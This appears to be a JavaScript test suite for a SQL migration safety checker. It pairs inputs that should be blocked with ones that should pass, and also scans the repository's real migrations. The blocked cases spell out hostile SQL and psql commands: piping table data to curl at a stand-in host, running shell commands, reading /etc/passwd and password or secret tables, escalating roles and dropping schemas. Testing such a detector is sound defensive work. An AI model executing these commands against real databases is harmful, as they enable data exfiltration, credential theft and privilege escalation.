// 测试库迁移第二道检查（tools/staging_migrate_check.mjs，#95）：每条规则一个「会拦」和一个「不拦」；再用仓库里真实的迁移核对没有误伤
import fs from 'fs'; import path from 'path'; import { fileURLToPath } from 'url';
import { check, stripComments, lex } from '../../tools/staging_migrate_check.mjs';
let pass = 0, fail = 0; const T = (n, ok, x) => { ok ? pass++ : fail++; if (!ok) console.log('FAIL ' + n + (x !== undefined ? ' ' + JSON.stringify(x) : '')) };
const DIR = process.argv[2] || path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const rules = sql => [...new Set(check(sql).map(x => x.rule))];
const blocks = (n, sql, rule) => T(`拦：${n}`, rules(sql).includes(rule), rules(sql));
const passes = (n, sql) => T(`不拦：${n}`, check(sql).length === 0, check(sql));

// —— 正常迁移（本仓库常见写法）
passes('加表 / 加列 / 索引 / 函数 / 行级安全 / 授权给 nbq_ 角色', `create table if not exists t (id uuid primary key, user_id uuid);
alter table t enable row level security; drop policy if exists p on t; create policy p on t to nbq_user using (user_id = nbq_uid());
create or replace function f() returns int language plpgsql security definer set search_path = public as $$ begin perform 1; return 1; end $$;
revoke execute on function f() from public, nbq_viewer; grant execute on function f() to nbq_user, nbq_service;
grant select, insert on t to nbq_service; insert into schema_migrations(version) values ('20261201_x') on conflict do nothing;`);
passes('注释里提到危险词不算', `-- 以后可能要 create role、copy ... to、auth.users、execute format\n/* drop schema x; grant nbq_admin to nbq_user; */ select 1;`);
passes('事件名 share_copy_link、函数名 nbq_execute_x 不算', `insert into e(n) values ('share_copy_link'); select nbq_execute_x();`);

// —— 每条规则
blocks('audit-allow', `-- audit-allow: 清理旧数据\ndelete from t;`, 'audit-allow');
blocks('建角色', `create role evil login password 'x';`, '角色');
blocks('改角色', `alter role nbq_user superuser;`, '角色');
blocks('切换身份', `set local role nbq_admin;`, '切换身份');
blocks('session authorization', `set session authorization postgres;`, '切换身份');
blocks('改所有者', `alter table t owner to evil;`, '所有者');
blocks('默认权限', `alter default privileges grant all on tables to public;`, '所有者');
blocks('copy 到程序', `copy t to program 'curl -d @- x.example';`, '读写文件');
blocks('读服务器文件', `select pg_read_file('/etc/passwd');`, '读写文件');
blocks('pg_net 外联', `select net.http_post('https://x.example', '{}');`, '外联');
blocks('dblink', `select * from dblink('host=x', 'select 1') as t(a int);`, '外联');
blocks('读登录用户表', `select phone from auth.users;`, '内部 schema');
blocks('读密钥库', `select * from vault.decrypted_secrets;`, '内部 schema');
blocks('函数体里藏着读 auth', `do $$ begin perform (select count(*) from auth.users); end $$;`, '内部 schema');
blocks('建扩展', `create extension if not exists http;`, '扩展与库级');
blocks('改库设置', `alter database postgres set log_statement = 'none';`, '扩展与库级');
blocks('删 schema', `drop schema public cascade;`, '扩展与库级');
blocks('动态 SQL：format', `do $$ begin execute format('drop table %I', 't'); end $$;`, '动态 SQL');
blocks('动态 SQL：拼字符串', `do $$ declare q text := 'x'; begin execute q || ';'; end $$;`, '动态 SQL');
blocks('动态 SQL：字面量', `do $$ begin execute 'select 1'; end $$;`, '动态 SQL');
blocks('关行级安全', `alter table users disable row level security;`, '关闭行级安全');
blocks('授权给 public', `grant select on users to public;`, '权限');
blocks('授权给 Supabase 角色', `grant select on users to anon, authenticated;`, '权限');
blocks('角色成员提权', `grant nbq_admin to nbq_user;`, '权限');
blocks('with grant option', `grant select on t to nbq_user with grant option;`, '权限');
// —— #95 独立复核（11-09）补的：每条对修复前的版本会红
blocks('元命令 \\! 执行 shell', `select 1;\n\\! id\n`, '元命令');
blocks('元命令 \\i 读文件', `\\i /etc/passwd`, '元命令');
blocks('元命令 \\gexec', `select 'drop table t' \\gexec`, '元命令');
blocks('元命令 \\o 管道', `\\o |curl -d @- x.example\nselect 1;`, '元命令');
blocks('元命令藏在 E 字符串之后（词法对齐）', `select E'\\'';\n\\! id\n`, '元命令');
passes('字符串 / $$ 体里的反斜杠不算元命令', `select '\\d+'; do $$ begin perform 1 where 'a' ~ '\\w'; end $$;`);
blocks('带引号的内部 schema', `select * from "auth"."users";`, '内部 schema');
blocks('带空格的内部 schema', `select * from auth . users;`, '内部 schema');
blocks('改系统表', `update pg_catalog.pg_proc set prosecdef = true;`, '系统表');
blocks('读口令表', `do $$ begin perform (select rolpassword from pg_authid limit 1); end $$;`, '系统表');
blocks('set_config 切身份', `select set_config('role', 'postgres', false);`, '改服务器设置');
blocks('pg_reload_conf', `select pg_reload_conf();`, '改服务器设置');
blocks('query_to_xml 执行字符串', `select query_to_xml('select * from x', true, false, '');`, '执行字符串 SQL');
blocks('建订阅', `create subscription s connection 'host=x' publication p;`, '库级对象');
blocks('事件触发器', `create event trigger e on ddl_command_start execute function f();`, '库级对象');
blocks('drop owned', `drop owned by nbq_user;`, '库级对象');
blocks('reassign owned', `reassign owned by nbq_user to evil;`, '库级对象');
blocks('security label', `security label on table t is 'x';`, '库级对象');
blocks('非 sql / plpgsql 语言', `create function f() returns int language plpython3u as $$ return 1 $$;`, '函数语言');
blocks('concurrently 不能进事务', `create index concurrently i on t(a);`, '不能进事务');
blocks('白名单外：set', `set statement_timeout = 0;`, '白名单外');
blocks('白名单外：lock / call', `lock table t; call p();`, '白名单外');
passes('begin … commit 包着的普通迁移', `begin;\ncreate table if not exists t (id int);\ncommit;`);
T('lex 保留行数（含嵌套注释、E 字符串）', lex(`a /* x /* y */\n z */ b\nE'\\'\n'`, { strings: true, bodies: true }).split('\n').length === 4);
T('行号指向命中的那一行', (check(`select 1;\n\nselect * from auth.users;`)[0] || {}).line === 3, check(`select 1;\n\nselect * from auth.users;`));
T('去注释后行数不变', stripComments(`a -- x\n/* y\nz */ b\n'--不是注释'`).split('\n').length === 4 && stripComments(`'--不是注释'`).includes('--不是注释'));

// —— 仓库里的真实迁移：被拦的只能是「角色 / 切换身份 / 权限」类（本来就该所有者手动执行）；断言规则，不写死文件名（#95 复核第 6 条）
const MIG = path.join(DIR, 'server/migrations'), files = fs.readdirSync(MIG).filter(f => /^2026\d{4}_[a-z0-9_]+\.sql$/.test(f));
const OWNER_ONLY = ['角色', '切换身份', '权限'];
const odd = files.map(f => [f, rules(fs.readFileSync(path.join(MIG, f), 'utf8')).filter(r => !OWNER_ONLY.includes(r))]).filter(([, r]) => r.length);
T(`真实迁移（${files.length} 个）：没有被角色 / 权限以外的规则拦（被拦说明规则误伤，先改规则）`, odd.length === 0, odd);

console.log(`staging_migrate_check: ${pass} passed, ${fail} failed`); process.exit(fail ? 1 : 0);
